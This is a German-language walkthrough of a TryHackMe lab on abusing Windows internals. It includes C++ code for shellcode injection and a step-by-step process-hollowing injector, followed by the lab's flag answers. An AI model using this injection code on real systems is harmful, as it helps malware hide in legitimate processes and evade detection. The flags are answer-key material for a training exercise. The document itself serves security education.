# Abusing Windows Internals
Dies ist eine einführung zu dem TryHackMe Raum: [Abusing Windows Internals](https://tryhackme.com/r/room/abusingwindowsinternals)

# Task 1 - Introduction (Einführung)
Windows-Internals sind entscheidend für die Funktionsweise des Windows-Betriebssystems. Dies macht sie zu einem lukrativen Angriffsziel für bösartige Zwecke. Windows-Internals können verwendet werden, um Code zu verbergen und auszuführen, Erkennungen zu umgehen und mit anderen Techniken oder Exploits zu verknüpfen.

Der Begriff Windows-Internals umfasst jede Komponente, die auf der Backend-Seite des Windows-Betriebssystems gefunden werden kann. Dazu gehören Prozesse, Dateiformate, COM (Component Object Model), Taskplanung, I/O-System usw. Dieser Raum wird sich darauf konzentrieren, Prozesse und ihre Komponenten, DLLs (Dynamic Link Libraries) sowie das PE (Portable Executable) Format zu missbrauchen und auszunutzen.

### Lernziele:

- Verständnis dafür entwickeln, wie interne Komponenten angreifbar sind
- Erlernen, wie man Schwachstellen in Windows-Internals ausnutzt und missbraucht
- Verständnis für Maßnahmen zur Minderung und Erkennung dieser Techniken entwickeln
- Anwendung der erlernten Techniken auf eine Fallstudie aus der realen Welt

Bevor Sie mit diesem Raum beginnen, machen Sie sich mit der grundlegenden Nutzung und Funktionalität von Windows vertraut. Es ist empfelendwert, den Raum zu [Windows-Internals](https://tryhackme.com/r/room/windowsinternals) zu absolvieren. Grundlegende Programmierkenntnisse in C++ und PowerShell werden ebenfalls empfohlen, sind aber nicht zwingend erforderlich.

# Task 2 - Prozesse ausnutzen
Anwendungen, die auf deinem Betriebssystem laufen, können einen oder mehrere Prozesse enthalten. Prozesse verwalten und repräsentieren ein Programm, das ausgeführt wird.

Prozesse haben viele weitere Unterkomponenten und interagieren direkt mit dem Speicher oder dem virtuellen Speicher, was sie zu einem idealen Ziel macht. Die folgende Tabelle beschreibt jede kritische Komponente von Prozessen und deren Zweck.
| Prozesskomponente                | Zweck                                                                 |
|----------------------------------|----------------------------------------------------------------------|
| Privater virtueller Adressraum   | Virtuelle Speicheradressen, die dem Prozess zugewiesen sind.         |
| Ausführbares Programm            | Definiert Code und Daten, die im virtuellen Adressraum gespeichert sind. |
| Offene Handles                   | Definiert Handles zu Systemressourcen, auf die der Prozess zugreifen kann. |
| Sicherheitskontext               | Das Zugriffstoken definiert den Benutzer, Sicherheitsgruppen, Berechtigungen und andere Sicherheitsinformationen. |
| Prozess-ID                       | Eindeutige numerische Kennung des Prozesses.                          |
| Threads                          | Abschnitt eines Prozesses, der zur Ausführung eingeplant ist.        |

Für weitere Informationen über Prozesse, sieh dir den [Windows Internals](https://tryhackme.com/r/room/windowsinternals) Raum an.

Prozessinjektion wird häufig als Oberbegriff verwendet, um das Einschleusen von schädlichem Code in einen Prozess durch legitime Funktionalitäten oder Komponenten zu beschreiben. In diesem Raum konzentrieren wir uns auf vier verschiedene Arten der Prozessinjektion, wie unten beschrieben.
| Injektionstyp                     | Funktion                                                                                   |
|-----------------------------------|--------------------------------------------------------------------------------------------|
| Process Hollowing                 | Code in einen angehaltenen und "ausgehöhlten" Zielprozess einschleusen                      |
| Thread Execution Hijacking        | Code in einen angehaltenen Zielthread einschleusen                                          |
| Dynamic-link Library Injection    | Eine DLL in den Prozessspeicher einschleusen                                                 |
| Portable Executable Injection     | Ein PE-Image selbst in einen Zielprozess einschleusen, das auf eine schädliche Funktion zeigt |

Es gibt viele andere Formen der Prozessinjektion, die von MITRE im Rahmen der T1055 beschrieben werden. [MITRE T1055](https://attack.mitre.org/techniques/T1055/)

Auf der grundlegendsten Ebene nimmt die Prozessinjektion die Form der Shellcode-Injektion an.

Auf einer höheren Ebene kann die Shellcode-Injektion in vier Schritte unterteilt werden:

1. Öffnen eines Zielprozesses mit allen Zugriffsrechten.
2. Allozieren von Speicher im Zielprozess für den Shellcode.
3. Schreiben des Shellcodes in den allozierten Speicher im Zielprozess.
4. Ausführen des Shellcodes mithilfe eines Remote-Threads.

Die Schritte können auch grafisch dargestellt werden, um zu zeigen, wie Windows-API-Aufrufe mit dem Prozessspeicher interagieren.

![Shellcode Injection Prozess Darstellung](Bilder/2024-06-24-Shellcode_Injection_Prozess_Darstellung.png)

# Erklärung der Shellcode-Injektionsgrafik

Diese Grafik zeigt die Schritte der Shellcode-Injektion in einem Zielprozess durch einen bösartigen Prozess und wie Windows-API-Aufrufe dabei interagieren. Hier ist eine Erklärung der einzelnen Schritte und Komponenten:

1. **OpenProcess**:
   - Der bösartige Prozess (unten links) verwendet die API-Funktion `OpenProcess`, um den Zielprozess (oben links) mit allen erforderlichen Zugriffsrechten zu öffnen. Dies ermöglicht dem bösartigen Prozess, auf den Speicher des Zielprozesses zuzugreifen.

2. **VirtualAlloc**:
   - Der bösartige Prozess verwendet die API-Funktion `VirtualAlloc`, um einen Speicherbereich im Zielprozess zu allozieren. Dieser Schritt bereitet den Speicher vor, in den der Shellcode geschrieben werden soll.

3. **WriteProcessMemory**:
   - Der bösartige Prozess verwendet die API-Funktion `WriteProcessMemory`, um den Shellcode in den zuvor allokierten Speicherbereich im Zielprozess zu schreiben.

4. **CreateRemoteThread**:
   - Der bösartige Prozess verwendet die API-Funktion `CreateRemoteThread`, um einen neuen Thread im Zielprozess zu erstellen, der den Shellcode ausführt. Dies ermöglicht es dem bösartigen Code, innerhalb des Kontextes des Zielprozesses ausgeführt zu werden.

## Prozessspeicherregionen

- Die verschiedenen Speicherregionen des Zielprozesses sind in blau dargestellt, einschließlich DLLs, Register, Prozess-Heap, Thread-Stack und allgemeine Prozessspeicherregionen.
- Die "Malicious Memory Region" (bösartige Speicherregion) ist der Bereich, in dem der Shellcode eingefügt und ausgeführt wird.

Durch diese Schritte wird der Shellcode in den Speicher des Zielprozesses injiziert und ausgeführt, was dem Angreifer die Möglichkeit gibt, Kontrolle über den Zielprozess zu erlangen und bösartige Aktivitäten durchzuführen.

Im ersten Schritt der Shellcode-Injektion müssen wir einen Zielprozess mit speziellen Parametern öffnen. `OpenProcess` wird verwendet, um den Zielprozess zu öffnen, der über die Befehlszeile angegeben wird.
```C++
processHandle = OpenProcess(
	PROCESS_ALL_ACCESS, // Defines access rights
	FALSE, // Target handle will not be inhereted
	DWORD(atoi(argv[1])) // Local process supplied by command-line arguments 
);
```


Im zweiten Schritt müssen wir Speicher in der Größe des Shellcodes allozieren. Die Speicherallokation wird mit `VirtualAllocEx` durchgeführt. Innerhalb des Aufrufs wird der Parameter `dwSize` mit der Funktion sizeof definiert, um die Anzahl der Bytes des Shellcodes zu erhalten, die allokiert werden sollen.
```C++
remoteBuffer = VirtualAllocEx(
	processHandle, // Opened target process
	NULL, 
	sizeof shellcode, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);
```


Im dritten Schritt können wir nun den allokierten Speicherbereich verwenden, um unseren Shellcode zu schreiben. `WriteProcessMemory` wird häufig verwendet, um in Speicherbereiche zu schreiben.
```C++
WriteProcessMemory(
	processHandle, // Opened target process
	remoteBuffer, // Allocated memory region
	shellcode, // Data to write
	sizeof shellcode, // byte size of data
	NULL
);
```


Im vierten Schritt haben wir nun die Kontrolle über den Prozess, und unser schädlicher Code ist im Speicher geschrieben. Um den im Speicher befindlichen Shellcode auszuführen, können wir `CreateRemoteThread` verwenden; Threads steuern die Ausführung von Prozessen.
```C++
remoteThread = CreateRemoteThread(
	processHandle, // Opened target process
	NULL, 
	0, // Default size of the stack
	(LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread
	NULL, 
	0, // Ran immediately after creation
	NULL
);
```

Wir können diese Schritte zusammenfassen, um einen einfachen Prozessinjektor zu erstellen. Verwenden Sie den bereitgestellten C++ Injektor und experimentieren Sie mit der Prozessinjektion.

Shellcode-Injektion ist die grundlegendste Form der Prozessinjektion; in der nächsten Aufgabe werden wir untersuchen, wie wir diese Schritte für das Process Hollowing modifizieren und anpassen können.

## Fragen:

Identifizieren Sie eine PID eines Prozesses, der als THM-Attacker ausgeführt wird, um diesen zu zielen. Sobald die PID identifiziert ist, geben Sie die PID als Argument an, um shellcode-injector.exe im Verzeichnis Injectors auf dem Desktop auszuführen.
```
Starte den Task Manager und gehe zu den Reiter Details und suche dort nach einem Prozess, als beispiel nutzte ich den Explorer.exe prozess. syntax shellcode-injector.exe <PID>
```

Welche Flagge wird nach dem Einspritzen des Shellcodes erhalten?
```
THM{1nj3c710n_15_fun!}
```

# Task 3 - Erweiterung des Prozessmissbrauchs
Im vorherigen Task haben wir besprochen, wie wir Shellcode-Injection verwenden können, um bösartigen Code in einen legitimen Prozess einzuschleusen. In diesem Task werden wir Process Hollowing behandeln. Ähnlich wie bei der Shellcode-Injection bietet diese Technik die Möglichkeit, eine komplette bösartige Datei in einen Prozess einzuschleusen. Dies wird erreicht, indem der Prozess „ausgehöhlt“ oder entmappt wird und spezifische PE (Portable Executable) Daten und Abschnitte in den Prozess injiziert werden.

Auf hoher Ebene kann Process Hollowing in sechs Schritte unterteilt werden:

1. Einen Zielprozess im angehaltenen Zustand erstellen.
2. Ein bösartiges Image öffnen.
3. Legitimen Code aus dem Prozessspeicher entmapen.
4. Speicherbereiche für den bösartigen Code zuweisen und jeden Abschnitt in den Adressraum schreiben.
5. Einen Einstiegspunkt für den bösartigen Code festlegen.
6. Den Zielprozess aus dem angehaltenen Zustand herausnehmen.

Die Schritte können auch grafisch dargestellt werden, um zu zeigen, wie Windows API-Aufrufe mit dem Prozessspeicher interagieren.
![Abusing of Windows Internals](Bilder/2024-06-24-Abusing-of-Windows-Internals.png)

1. **Suspendierter Prozess**: Dies ist der Ausgangspunkt. Ein laufendes Programm wird vorübergehend gestoppt.

2. **DLL-Injektion**: Der Angreifer injiziert eine DLL (Dynamic Link Library) in den Adressraum eines anderen Prozesses. Dies ermöglicht es, eigenen Code im Kontext des Prozesses auszuführen. Die DLL-Injektion ist im Bereich "DLLS" dargestellt.

3. **Prozess-Heap-Exploitation**: Hier manipuliert der Angreifer den Prozess-Heap, um Speicherfehler auszunutzen und bösartigen Code einzufügen. Dieser Schritt ist im Bereich "Process Heap" zu finden.

4. **Thread-Stack-Manipulation**: Durch Manipulation des Thread-Stacks kann der Angreifer den Programmfluss ändern und eigenen Code ausführen. Dies ist im Bereich "Thread Stack" dargestellt.

5. **Memory Region Hollowing**: Hierbei wird der Speicherbereich eines Prozesses geleert und mit bösartigem Code überschrieben. Du findest diesen Schritt im Bereich "Hollowed Memory".

6. **Virtual Memory und Schreiben in den Speicher**: Der Angreifer reserviert virtuellen Speicher und schreibt bösartigen Code hinein. Dies ist im Bereich "VirtualAlloc" zu sehen.

7. **Setzen des Thread-Kontexts**: Schließlich wird der Thread-Kontext so geändert, dass der bösartige Code ausgeführt wird. Dieser Schritt ist im Bereich "SetThreadContext" dargestellt.

Wir werden einen grundlegenden Process Hollowing Injector aufschlüsseln, um jeden der Schritte zu identifizieren und unten ausführlicher zu erklären.

Im ersten Schritt des Process Hollowing müssen wir einen Zielprozess im angehaltenen Zustand erstellen, indem wir `CreateProcessA` verwenden. Um die erforderlichen Parameter für den API-Aufruf zu erhalten, können wir die Strukturen `STARTUPINFOA` und `PROCESS_INFORMATION` verwenden.

```C++
LPSTARTUPINFOA target_si = new STARTUPINFOA(); // Defines station, desktop, handles, and appearance of a process
LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION(); // Information about the process and primary thread
CONTEXT c; // Context structure pointer

if (CreateProcessA(
	(LPSTR)"C:\\\\Windows\\\\System32\\\\svchost.exe", // Name of module to execute
	NULL,
	NULL,
	NULL,
	TRUE, // Handles are inherited from the calling process
	CREATE_SUSPENDED, // New process is suspended
	NULL,
	NULL,
	target_si, // pointer to startup info
	target_pi) == 0) { // pointer to process information
	cout << "[!] Failed to create Target process. Last Error: " << GetLastError();
	return 1;
```

Im zweiten Schritt müssen wir ein bösartiges Image öffnen, das injiziert werden soll. Dieser Prozess ist in drei Schritte unterteilt, beginnend mit der Verwendung von CreateFileA, um ein Handle für das bösartige Image zu erhalten.
```C++
HANDLE hMaliciousCode = CreateFileA(
	(LPCSTR)"C:\\\\Users\\\\tryhackme\\\\malware.exe", // Name of image to obtain
	GENERIC_READ, // Read-only access
	FILE_SHARE_READ, // Read-only share mode
	NULL,
	OPEN_EXISTING, // Instructed to open a file or device if it exists
	NULL,
	NULL
);
```

Sobald ein Handle für das bösartige Image erhalten wurde, muss Speicher für den lokalen Prozess mit `VirtualAlloc` zugewiesen werden. `GetFileSize` wird ebenfalls verwendet, um die Größe des bösartigen Images für `dwSize` abzurufen.
```C++
DWORD maliciousFileSize = GetFileSize(
	hMaliciousCode, // Handle of malicious image
	0 // Returns no error
);

PVOID pMaliciousImage = VirtualAlloc(
	NULL,
	maliciousFileSize, // File size of malicious image
	0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
	0x04 // Enables read/write access (PAGE_READWRITE)
);
```

Nun, da Speicher für den lokalen Prozess zugewiesen wurde, muss dieser beschrieben werden. Mit den Informationen aus den vorherigen Schritten können wir `ReadFile` verwenden, um in den lokalen Prozessspeicher zu schreiben.
```C++
DWORD numberOfBytesRead; // Stores number of bytes read

if (!ReadFile(
	hMaliciousCode, // Handle of malicious image
	pMaliciousImage, // Allocated region of memory
	maliciousFileSize, // File size of malicious image
	&numberOfBytesRead, // Number of bytes read
	NULL
	)) {
	cout << "[!] Unable to read Malicious file into memory. Error: " <<GetLastError()<< endl;
	TerminateProcess(target_pi->hProcess, 0);
	return 1;
}

CloseHandle(hMaliciousCode);
```

Im dritten Schritt muss der Prozess durch Entmapen des Speichers "ausgehöhlt" werden. Bevor das Entmapen erfolgen kann, müssen wir die Parameter des API-Aufrufs identifizieren. Wir müssen die Speicherposition des Prozesses und den Einstiegspunkt identifizieren. Die CPU-Register `EAX` (Einstiegspunkt) und `EBX` (PEB-Position) enthalten die benötigten Informationen, die durch Verwendung von `GetThreadContext` gefunden werden können. Sobald beide Register gefunden sind, wird `ReadProcessMemory` verwendet, um die Basisadresse aus `EBX` mit einem Offset (`0x8`), der aus der Untersuchung des PEB stammt, zu erhalten.
```C++
c.ContextFlags = CONTEXT_INTEGER; // Only stores CPU registers in the pointer
GetThreadContext(
	target_pi->hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
	&c // Pointer to store retrieved context
); // Obtains the current thread context

PVOID pTargetImageBaseAddress; 
ReadProcessMemory(
	target_pi->hProcess, // Handle for the process obtained from the PROCESS_INFORMATION structure
	(PVOID)(c.Ebx + 8), // Pointer to the base address
	&pTargetImageBaseAddress, // Store target base address 
	sizeof(PVOID), // Bytes to read 
	0 // Number of bytes out
);
```

Nachdem die Basisadresse gespeichert ist, können wir mit dem Entmapen des Speichers beginnen. Wir können `ZwUnmapViewOfSection` verwenden, das aus ntdll.dll importiert wird, um Speicher vom Zielprozess freizugeben.
```C++
HMODULE hNtdllBase = GetModuleHandleA("ntdll.dll"); // Obtains the handle for ntdll
pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(
	hNtdllBase, // Handle of ntdll
	"ZwUnmapViewOfSection" // API call to obtain
); // Obtains ZwUnmapViewOfSection from ntdll

DWORD dwResult = pZwUnmapViewOfSection(
	target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
	pTargetImageBaseAddress // Base address of the process
);
```

Im vierten Schritt müssen wir damit beginnen, Speicher im "geleerten" Prozess zuzuweisen. Ähnlich wie in Schritt zwei können wir `VirtualAlloc` verwenden, um Speicher zuzuweisen. Diesmal müssen wir die Größe des Images aus den Dateiköpfen erhalten. Mit `e_lfanew` kann die Anzahl der Bytes vom DOS-Header zum PE-Header identifiziert werden. Sobald beim PE-Header angekommen, können wir die `SizeOfImage` aus dem Optional Header erhalten.
```C++
PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage; // Obtains the DOS header from the malicious image
PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew); // Obtains the NT header from e_lfanew

DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage; // Obtains the size of the optional header from the NT header structure

PVOID pHollowAddress = VirtualAllocEx(
	target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
	pTargetImageBaseAddress, // Base address of the process
	sizeOfMaliciousImage, // Byte size obtained from optional header
	0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
	0x40 // Enabled execute and read/write access (PAGE_EXECUTE_READWRITE)
);
```

Nachdem der Speicher zugewiesen ist, können wir die bösartige Datei in den Speicher schreiben. Da wir eine Datei schreiben, müssen wir zuerst die PE-Header und dann die PE-Sektionen schreiben. Um die PE-Header zu schreiben, können wir `WriteProcessMemory` verwenden und die Größe der Header verwenden, um festzulegen, wo wir aufhören müssen.
```C++
if (!WriteProcessMemory(
	target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
	pTargetImageBaseAddress, // Base address of the process
	pMaliciousImage, // Local memory where the malicious file resides
	pNTHeaders->OptionalHeader.SizeOfHeaders, // Byte size of PE headers 
	NULL
)) {
	cout<< "[!] Writting Headers failed. Error: " << GetLastError() << endl;
}
```

Jetzt müssen wir jede Sektion schreiben. Um die Anzahl der Sektionen zu finden, können wir `NumberOfSections` aus den NT-Headern verwenden. Wir können eine Schleife durch `e_lfanew` und die Größe des aktuellen Headers durchlaufen, um jede Sektion zu schreiben.
```C++
for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) { // Loop based on number of sections in PE data
	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER))); // Determines the current PE section header

	WriteProcessMemory(
		target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
		(PVOID)((LPBYTE)pHollowAddress + pSectionHeader->VirtualAddress), // Base address of current section 
		(PVOID)((LPBYTE)pMaliciousImage + pSectionHeader->PointerToRawData), // Pointer for content of current section
		pSectionHeader->SizeOfRawData, // Byte size of current section
		NULL
	);
}
```

Es ist auch möglich, Relokationstabellen zu verwenden, um die Datei in den Ziel-Speicher zu schreiben. Dies wird im Task 6 genauer erläutert.

Im fünften Schritt können wir `SetThreadContext` verwenden, um `EAX` so zu ändern, dass es auf den Einstiegspunkt zeigt.
```C++
c.Eax = (SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint); // Set the context structure pointer to the entry point from the PE optional header

SetThreadContext(
	target_pi->hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
	&c // Pointer to the stored context structure
);
```

Im sechsten Schritt müssen wir den Prozess aus dem angehaltenen Zustand herausnehmen, indem wir ResumeThread verwenden.
```C++
ResumeThread(
	target_pi->hThread // Handle to the thread obtained from the PROCESS_INFORMATION structure
);
```
Wir können diese Schritte zusammenstellen, um einen Prozess-Hollowing-Injector zu erstellen. Verwenden Sie den bereitgestellten C++-Injector und experimentieren Sie mit Process Hollowing.

## Fragen:
Identifizieren Sie eine PID eines als THM-Attacker ausgeführten Prozesses, den Sie als Ziel verwenden möchten. Geben Sie die PID und den ausführbaren Dateinamen als Argumente an, um hollowing-injector.exe auszuführen, das sich im Verzeichnis "injectors" auf dem Desktop befindet:
```
Starte den Task Manager und gehe zu den Reiter Details und suche dort nach einem Prozess, als beispiel nutzte ich den Explorer.exe prozess. syntax hollowing-injector.exe <PID>
```

Welche Flagge wird nach dem Ausführen von Hollowing und dem Einspritzen des Shellcodes erhalten?
```
THM{7h3r35_n07h1n6_h3r3}
```
